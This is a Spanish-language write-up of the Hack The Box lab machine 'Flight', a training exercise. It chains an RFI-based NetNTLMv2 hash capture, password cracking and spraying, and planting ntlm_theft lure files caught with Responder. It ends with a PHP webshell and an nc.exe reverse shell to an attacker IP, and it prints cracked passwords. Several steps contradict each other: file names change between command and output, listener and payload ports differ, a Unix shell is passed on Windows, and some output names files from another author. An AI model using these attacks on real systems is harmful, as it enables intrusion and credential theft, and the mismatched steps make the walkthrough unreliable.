---
tags:
title: Flight - Hard (HTB)
permalink: /Flight-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49667,49673,49674,49694,49719 10.10.11.187
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 22:25 EDT
Nmap scan report for 10.10.11.187
Host is up (0.44s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: g0 Aviation
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-10 09:25:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-10T09:26:36
|_  start_date: N/A
|_clock-skew: 6h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.32 seconds*
```

# Service enumeration

### Port 80 HTTP/s

Por el puerto `80` vemos una pagina web casi vacia de datos. y sus funcionalidades no hacen nada de nada.

![image-20221024134332643](images/image-20221024134332643.webp)

Debido a que sus funcionalidades no hacen nada de nada. pasemos a la enumeration de subdirectorios y subdominios
#### Gobuster directory enumeration 

```bash
gobuster dir -u http://10.10.11.187/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,ini,asp,aspx,js,py,txt,md -t 200 -q

/Images               (Status: 301) [Size: 337] [--> http://10.10.11.187/Images/]
/css                  (Status: 301) [Size: 334] [--> http://10.10.11.187/css/]
/js                   (Status: 301) [Size: 333] [--> http://10.10.11.187/js/]
/examples             (Status: 503) [Size: 401]
/licenses             (Status: 403) [Size: 420]
/IMAGES               (Status: 301) [Size: 337] [--> http://10.10.11.187/IMAGES/]
/*checkout*.js        (Status: 403) [Size: 301]
/*checkout*           (Status: 403) [Size: 301]
/*checkout*.asp       (Status: 403) [Size: 301]
/*checkout*.txt       (Status: 403) [Size: 301]
/*checkout*.md        (Status: 403) [Size: 301]
/*checkout*.ini       (Status: 403) [Size: 301]
/*checkout*.aspx      (Status: 403) [Size: 301]
/*checkout*.php       (Status: 403) [Size: 301]
/*checkout*.py        (Status: 403) [Size: 301]
/CSS                  (Status: 301) [Size: 334] [--> http://10.10.11.187/CSS/]
```

Cada uno de estos subdirectorios no tienen nada de informacion y algunos otros nos rediriguen a la pagina principal. Asi que paso a la enumeracion de subdominios con `wfuzz`

#### Wfuzz vhost enumeration

```bash
wfuzz -c -t 200 -H "Host: FUZZ.flight.htb" -u http://flight.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw=530
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz''s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://flight.htb/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000624:   200        90 L     412 W      3996 Ch     "school"                                                                    
```

Descubrimos el subdominio `school` asi que una vez vemos esto lo agreamos al `/etc/hosts`.

![image-20221028095654839](images/image-20221028095654839.webp)

Enumerando la pagina no tiene nada al igual que la pagina principal, pero al enumerar cada uno de los enlaces a los que nos redirigue si clickeamos en `about us` o `blog` vemos esto.

### LFI (Local File Inclusion)

![[Untitled 49 1.jpg]]

Como puedo ver la pagina tiene un parametro `page` que ya me resulta conocido de otras maquinas, este parametro tiene que recibir un recurso existente en el dominio. Podriamos intentar un `Path traversal` retrocediendo directorios con `../`.

![[Untitled 50 1.jpg]]

Al parecer la pagina tiene algun tipo de sanitizacion en el codigo el cual cada intentos de payloads como `../`, `....//` o `..%2f` y payloads encodeados los detecta como algo sospechoso, asi que lo que puedo intentar es pasarle la ruta completa de por ejemplo el `/etc/hosts` de windows que se localiza en `C:\Windows\System32\drivers\etc\hosts`. 

![[Untitled 51 1.jpg]]

Tenemos exito al intentar eso asi que podemos pasar a enumerar archivos los cuales contengan contenido interesante, pero no encontramos nada de nada.
Ahora se me ocurre el caso parecido a un `lfi` que es un `RFI ( Remote File Inclusion ) `, para hacer esto tenemos que poner nuestra `ip` y indicarle un archivo al cual tiene que hacer la peticion. 

Por ejemplo hacemos algo asi: `http://<Nuestra Ip>/test.js`, para esto levantamos nuestro servidor en `Python`

```bash
python3 -m http.server 80
```

Y una vez enviamos el comando, vemos que recibimos una respuesta del lado del servidor

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.187 - - [10/Oct/2025 00:53:18] code 404, message File not found
10.10.11.187 - - [10/Oct/2025 00:53:18] "GET /test.js HTTP/1.1" 404 -
^C
Keyboard interrupt received, exiting.
```

Por lo que se me ocurre ahora es crear un php y intentar una `webshell`, pero no va a funcionar asi que lo que podriamos hacer es montar un servidor `smb` e intentar hacer lo mismo desde la pagina pero solicitando un archivo compartido a nivel de red el cual no va a existir pero en caso de que funcione deberiamos de recibir la conexion del usuario que este detras de la pagina con un hash `NetNTLMv2`.

```bash
impacket-smbserver -smb2support smbFolder $(pwd)
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Y ahora enviamos esto : `\\<nuestra ip>\test`, y asi vamos a ver como la conexion se establece contra nuestro servidor.

```bash
impacket-smbserver -smb2support smbFolder $(pwd)
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.187,50173)
[*] AUTHENTICATE_MESSAGE (flight\svc_apache,G0)
[*] User G0\svc_apache authenticated successfully
[*] svc_apache::flight:aaaaaaaaaaaaaaaa:a55125914eadadc350928955158e7fee:0101000000000000801475e7a139dc01aebf84d3b38c350400000000010010004d00490049005a00740076004a006100030010004d00490049005a00740076004a0061000200100058005100690052007100650076004e000400100058005100690052007100650076004e0007000800801475e7a139dc01060004000200000008003000300000000000000000000000003000005e022a02b63c16c8d62fd03722f19f08c9c5cf3565e83fcf56d83ea83cd1ff6d0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0032000000000000000000
[*] Closing down connection (10.10.11.187,50173)
[*] Remaining connections []
```

Metemos el hash a un archivo para verificar que sea un hash `NetNTLMv2`.

```bash
hashid hash                                           
--File 'hash'--
Analyzing 'svc_apache::flight:aaaaaaaaaaaaaaaa:a55125914eadadc350928955158e7fee:0101000000000000801475e7a139dc01aebf84d3b38c350400000000010010004d00490049005a00740076004a006100030010004d00490049005a00740076004a0061000200100058005100690052007100650076004e000400100058005100690052007100650076004e0007000800801475e7a139dc01060004000200000008003000300000000000000000000000003000005e022a02b63c16c8d62fd03722f19f08c9c5cf3565e83fcf56d83ea83cd1ff6d0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0032000000000000000000'
[+] NetNTLMv2 
--End of file 'hash'--
```

Y con `john` lo rompemos.

```bash
john hash -w=/usr/share/wordlists/rockyou.txt         
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
S@Ss!K@*t13      (svc_apache)     
1g 0:00:00:02 DONE (2025-10-10 00:54) 0.4524g/s 4826Kp/s 4826Kc/s 4826KC/s SANTIBANEZ..Ryanelkins
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Tenemos una credencial la cual corresponde al usuario que realizo la conexion contra nuestro server.

`svc_apache:S@Ss!K@*t13`

#### Port 445 SMB

```bash
crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --shares
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [+] Enumerated shares
SMB         flight.htb      445    G0               Share           Permissions     Remark
SMB         flight.htb      445    G0               -----           -----------     ------
SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
SMB         flight.htb      445    G0               C$                              Default share
SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
SMB         flight.htb      445    G0               Shared          READ            
SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
SMB         flight.htb      445    G0               Users           READ            
SMB         flight.htb      445    G0               Web             READ
```

Una vez que sabemos que es valido el user y habiendo listado los shares , vemos que tenemos capacidad de lectura en varios de los shares. Para conectarme a los shares voy a usar `impacket-smbclient`.

##### Users
```bash
smb: \> use Users
smb: \> ls
  .                                  DR        0  Thu Sep 22 20:16:56 2022
  ..                                 DR        0  Thu Sep 22 20:16:56 2022
  .NET v4.5                           D        0  Thu Sep 22 19:28:03 2022
  .NET v4.5 Classic                   D        0  Thu Sep 22 19:28:02 2022
  Administrator                       D        0  Fri Oct 21 18:49:50 2022
  All Users                       DHSrn        0  Sat Sep 15 07:28:48 2018
  C.Bum                               D        0  Thu Sep 22 20:08:23 2022
  Default                           DHR        0  Tue Jul 20 19:20:24 2021
  Default User                    DHSrn        0  Sat Sep 15 07:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 07:16:48 2018
  Public                             DR        0  Tue Jul 20 19:23:25 2021
  svc_apache                          D        0  Fri Sep 23 07:10:00 2022

                7706623 blocks of size 4096. 3749019 blocks available
```

Vemos un usuario que al parecer tiene acceso a la maquina, el user `C.Bum`, pero a el voy a volver mas adelante.
##### Shared
El recurso `shared` no tiene nada de nada
```
smb: \> use shared
smb: \> ls
  .                                   D        0  Fri Oct 28 20:21:28 2022
  ..                                  D        0  Fri Oct 28 20:21:28 2022

                7706623 blocks of size 4096. 3749019 blocks available
```

##### Web

Y en `web` se encuentran alojadas las dos paginas.

```bash
smb: \> use web
smb: \> ls
  .                                   D        0  Fri Oct 28 21:17:00 2022
  ..                                  D        0  Fri Oct 28 21:17:00 2022
  flight.htb                          D        0  Fri Oct 28 21:17:00 2022
  school.flight.htb                   D        0  Fri Oct 28 21:17:00 2022
```

Como el usuario `svc_apache` no tiene acceso al contenido de los directorio, podemos realizar un `Password spray` para ver si algun otro usuario tiene esta capacidad de listar el contenido de los mismos.

Para enumerar usuarios voy a usar `rpcclient`.

```bash
rpcclient -U "svc_apache" 10.10.11.187
Password for [WORKGROUP\svc_apache]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[S.Moon] rid:[0x642]
user:[R.Cold] rid:[0x643]
user:[G.Lors] rid:[0x644]
user:[L.Kein] rid:[0x645]
user:[M.Gold] rid:[0x646]
user:[C.Bum] rid:[0x647]
user:[W.Walker] rid:[0x648]
user:[I.Francis] rid:[0x649]
user:[D.Truff] rid:[0x64a]
user:[V.Stevens] rid:[0x64b]
user:[svc_apache] rid:[0x64c]
user:[O.Possum] rid:[0x64d]
```

Estos nombres los agregamos a un archivo y con `crackmapexec` realizamos el ataque o tambien se puede realizar con `kerbrute`.

```bash
crackmapexec smb 10.10.11.187 -u users -p 'S@Ss!K@*t13' --continue-on-success
SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE
```

Vemos que el usuario `S.Moon` reutiliza la contraseña de `svc_apache` asi que vamos a ver si puede acceder a los recursos compartidos como `svc_apache`,

```bash
smbmap -u 's.moon' -p 'S@Ss!K@*t13' -H 10.10.11.187

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.187:445        Name: flight.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Shared                                                  READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
        Web                                                     READ ONLY
[*] Closed 1 connections
```

Como vemos que si hacemos la conexion.
```bash
impacket-smbclient flight.htb/s.moon:'S@Ss!K@*t13'@10.10.11.187 -dc-ip 10.10.11.187
```

Como vemos que al igual que `svc_apache` nosotros tampoco tenemos acceso a informacion pero podemos escribir en uno de los `shares` mas en concreto en `shared` podemos depositar archivos como muestro a continuacion.

```bash
# use shared
# ls
drw-rw-rw-          0  Fri Oct 10 08:11:48 2025 .
drw-rw-rw-          0  Fri Oct 10 08:11:48 2025 ..
# tree
Finished - 0 files and folders
# put hash
# ls
drw-rw-rw-          0  Fri Oct 10 08:19:53 2025 .
drw-rw-rw-          0  Fri Oct 10 08:19:53 2025 ..
-rw-rw-rw-        554  Fri Oct 10 08:19:54 2025 hash
```

Debido a que podemos hacer eso, podemos tratar de poner en el directorio algun archivo malicioso el cual si da el caso de que algun usario detras los abra o algo del estilo, no nos de una shell, pero si podriamos tratar de interceptar un hash al igual que como hicimos con `svc_apache`. 

Para la creacion de algun archivo malicioso podemos buscar en google cual es el formato valido o alguna tools que nos automatize la creacion de los mismos y nos encontramos con esta [herramienta](https://github.com/Greenwolf/ntlm_theft) 

```bash
git clone https://github.com/Greenwolf/ntlm_theft
```

Y la ejecutamos proporcionando nuestra `ip` que es contra la que va a realizar la conexion y el nombre de los archivos.

```bash
python3 ntlm_theft.py --generate all --server 10.10.16.2 --filename zs1n
/home/zs1n/Desktop/htb/flight/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: zs1n/zs1n.scf (BROWSE TO FOLDER)
Created: zs1n/zs1n-(url).url (BROWSE TO FOLDER)
Created: zs1n/zs1n-(icon).url (BROWSE TO FOLDER)
Created: zs1n/zs1n.lnk (BROWSE TO FOLDER)
Created: zs1n/zs1n.rtf (OPEN)
Created: zs1n/zs1n-(stylesheet).xml (OPEN)
Created: zs1n/zs1n-(fulldocx).xml (OPEN)
Created: zs1n/zs1n.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: zs1n/zs1n-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: zs1n/zs1n-(includepicture).docx (OPEN)
Created: zs1n/zs1n-(remotetemplate).docx (OPEN)
Created: zs1n/zs1n-(frameset).docx (OPEN)
Created: zs1n/zs1n-(externalcell).xlsx (OPEN)
Created: zs1n/zs1n.wax (OPEN)
Created: zs1n/zs1n.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: zs1n/zs1n.asx (OPEN)
Created: zs1n/zs1n.jnlp (OPEN)
Created: zs1n/zs1n.application (DOWNLOAD AND OPEN)
Created: zs1n/zs1n.pdf (OPEN AND ALLOW)
Created: zs1n/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: zs1n/zs1n.library-ms (BROWSE TO FOLDER)
Created: zs1n/Autorun.inf (BROWSE TO FOLDER)
Created: zs1n/desktop.ini (BROWSE TO FOLDER)
Created: zs1n/zs1n.theme (THEME TO INSTALL
Generation Complete.
```

Una vez creados chequeamos el contenido.

```bash
ls
docs  LICENSE  ntlm_theft.py  README.md  templates  zs1n

ls zs1n             
 Autorun.inf                    zs1n.asx                   'zs1n-(handler).htm'           zs1n.jnlp         zs1n.pdf                     'zs1n-(stylesheet).xml'
 desktop.ini                   'zs1n-(externalcell).xlsx'   zs1n.htm                      zs1n.library-ms  'zs1n-(remotetemplate).docx'   zs1n.theme
 zoom-attack-instructions.txt  'zs1n-(frameset).docx'      'zs1n-(icon).url'              zs1n.lnk          zs1n.rtf                     'zs1n-(url).url'
 zs1n.application              'zs1n-(fulldocx).xml'       'zs1n-(includepicture).docx'   zs1n.m3u          zs1n.scf                      zs1n.wax
```

Y ahora los depositamos todos en el share

```bash

smb: \> mput **
NT_STATUS_ACCESS_DENIED opening remote file \zs1n-(frameset).docx
putting file zs1n.jnlp as \0xdf.jnlp (0.7 kb/s) (average 0.7 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \zs1n.asx
putting file zs1n.application as \0xdf.application (6.0 kb/s) (average 3.3 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \zs1n.htm
putting file desktop.ini as \desktop.ini (0.2 kb/s) (average 1.7 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \zs1n.rtf
NT_STATUS_ACCESS_DENIED opening remote file \zs1n-(icon).url
putting file zs1n-(stylesheet).xml as \0xdf-(stylesheet).xml (0.6 kb/s) (average 1.5 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \zs1n.wax
NT_STATUS_ACCESS_DENIED opening remote file \zoom-attack-instructions.txt
NT_STATUS_ACCESS_DENIED opening remote file \zs1n-(includepicture).docx
NT_STATUS_ACCESS_DENIED opening remote file \zs1n.scf
NT_STATUS_ACCESS_DENIED opening remote file \zs1n.m3u
NT_STATUS_ACCESS_DENIED opening remote file \zs1n-(url).url
NT_STATUS_ACCESS_DENIED opening remote file \zs1n-(remotetemplate).docx
NT_STATUS_ACCESS_DENIED opening remote file \Autorun.inf
NT_STATUS_ACCESS_DENIED opening remote file \zs1n.pdf
putting file zs1n-(fulldocx).xml as \zs1n-(fulldocx).xml (156.1 kb/s) (average 40.2 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \zs1n-(externalcell).xlsx
NT_STATUS_ACCESS_DENIED opening remote file \zs1n.lnk
smb: \> ls
  .                                   D        0  Fri Oct 28 21:22:19 2022
  ..                                  D        0  Fri Oct 28 21:22:19 2022
  zs1n-(fulldocx).xml                 A    72584  Fri Oct 28 21:22:19 2022
  zs1n-(stylesheet).xml               A      162  Fri Oct 28 21:22:18 2022
  zs1n.application                    A     1649  Fri Oct 28 21:22:17 2022
  zs1n.jnlp                           A      191  Fri Oct 28 21:22:16 2022
  desktop.ini                         A       46  Fri Oct 28 21:22:17 2022

                7706623 blocks of size 4096. 3748999 blocks available
```

Vemos que solo algunos logramos depositarlos, por lo que ahora nos toca setear `Responder` a la espera de interceptar alguna conexion con su debido hash y el usuario que por detras realize la conexion.

```bash
 responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

<SNIP>                                                                                                                                             

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:2c220c83df67ac90:0B3C32E8570F3FE63EB4F6E178C6BFD9:010100000000000000B0C88F8539DC01E98D5B1819A1E78F0000000002000800510044004200540001001E00570049004E002D005100410052004100470044004E005200390031004F0004003400570049004E002D005100410052004100470044004E005200390031004F002E0051004400420054002E004C004F00430041004C000300140051004400420054002E004C004F00430041004C000500140051004400420054002E004C004F00430041004C000700080000B0C88F8539DC01060004000200000008003000300000000000000000000000003000005E022A02B63C16C8D62FD03722F19F08C9C5CF3565E83FCF56D83EA83CD1FF6D0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0032000000000000000000
```

Vemos que interceptamos el hash `NetNTLMv2` de `c.bum`, ahora al igual que antes lo depositamos en un archivo y lo rompemos con `john`.

```bash
john hash_cbum -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Tikkycoll_431012284 (c.bum)     
1g 0:00:00:01 DONE (2025-10-10 01:33) 0.6493g/s 6846Kp/s 6846Kc/s 6846KC/s TinyMutt69..Teacher21
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Una vez rompemos el hash descubrimos la contraseña: `Tikkycoll_431012284`, asi que pasamos a validarla.

```bash
crackmapexec smb flight.htb -u c.bum -p 'Tikkycoll_431012284'
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284
```

Y como vemos que lo es, pasamos a enumerar los shares ya que vimos antes que el usuario era valido.

```bash
crackmapexec smb flight.htb -u c.bum -p 'Tikkycoll_431012284' --shares
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
SMB         flight.htb      445    G0               [+] Enumerated shares
SMB         flight.htb      445    G0               Share           Permissions     Remark
SMB         flight.htb      445    G0               -----           -----------     ------
SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
SMB         flight.htb      445    G0               C$                              Default share
SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
SMB         flight.htb      445    G0               Shared          READ,WRITE      
SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
SMB         flight.htb      445    G0               Users           READ            
SMB         flight.htb      445    G0               Web             READ,WRITE   
```

Vemos que el usuario `c.bum` tiene permisos de escritura en el share `Web` asi que podriamos intentar depositar una webshell con php, ya que como sabemos ahi estan los directorios de las paginas `web`.

```php
<?php system($_GET['cmd']); ?>
```

Lo subimos a cualquiera de las dos paginas. En mi caso en `flight.htb` en la carpeta de `images`.

```bash
put cmd.php
putting file shell.php as \g0.flight.htb\images\shell.php (0.1 kb/s) (average 0.1 kb/s)
```

 Y chequeamos que este ahi.
 
![[Untitled 52 1.jpg]]

# Shell

Tambien voy a subir el `nc.exe` ya que con powershell no me deja enviarme una shell a mi maquina.

```bash
put nc.exe
putting file nc.exe as \g0.flight.htb\images\nx.exe (0.1 kb/s) (average 0.1 kb/s)
```

Y ahora nos enviamos la shell con `nc.exe`.

Primero preparamos nuestro listener con `nc` y luego con curl nos enviamos la shell

```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Enviamos la shell
```bash 
curl -s -X GET http://g0.flight.htb/images/cmd.php?cmd=nc.exe%2010.10.16.4%204444%20-e%20sh
```

# Shell as C.bum

```bash
rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.187 49897
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\school.flight.htb\styles>whoami
flight\svc_apache
```

# Enumeration

```bash
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 163B-E248

 Directory of C:\

10/25/2022  06:22 PM    <DIR>          inetpub
06/07/2022  06:39 AM    <DIR>          PerfLogs
10/21/2022  11:49 AM    <DIR>          Program Files
07/20/2021  12:23 PM    <DIR>          Program Files (x86)
10/25/2022  05:49 PM    <DIR>          Shared
09/22/2022  12:28 PM    <DIR>          StorageReports
09/22/2022  01:16 PM    <DIR>          Users
10/21/2022  11:52 AM    <DIR>          Windows
09/22/2022  01:16 PM    <DIR>          xampp
               0 File(s)              0 bytes
               9 Dir(s)  15,360,438,272 bytes free
```

Vemos el directorio `inetpub` que es donde habilitualmente corren los `IIS` y dentro de ella `wwwroot` que seria el `/var/www` o `/var/www/html` de linux.

```bash
C:\inetpub\wwwroot>dir    
dir
 Volume in drive C has no label.
 Volume Serial Number is 163B-E248

 Directory of C:\inetpub\wwwroot    

09/22/2022  12:28 PM    <DIR>          .
09/22/2022  12:28 PM    <DIR>          ..
09/22/2022  12:28 PM    <DIR>          aspnet_client
09/22/2022  12:24 PM               703 iisstart.htm
09/22/2022  12:24 PM            99,710 iisstart.png
               2 File(s)        100,413 bytes
               3 Dir(s)  15,360,327,680 bytes free
```

Tambien el directorio `development` que es al que deberia de tener acceso `c.bum` ya que forma parte del grupo `WebDevs` pero no es parte de `Remote Users` esto tiene sentido ya que por `WinRM` no podiamos acceder. Ademas podemos verificar con `icacls` que solo el usuario `c.bum` tiene permisos de escrituras dentro de este directorio

```powershell
C:\inetpub>icacls development
development flight\C.Bum:(OI)(CI)(W)
            NT SERVICE\TrustedInstaller:(I)(F)
            NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
            NT AUTHORITY\SYSTEM:(I)(F)
            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
            BUILTIN\Administrators:(I)(F)
            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
            BUILTIN\Users:(I)(RX)
            BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
            CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

Ademas si chequeamos los puerto abiertos localmente vemos el puerto `8000` que quizas podria ser otra web administrada por `c.bum`.

```powershell
PS C:\inetpub> netstat -ano | findstr LISTENING
netstat -ano | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       3580
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       920
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       3580
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       920
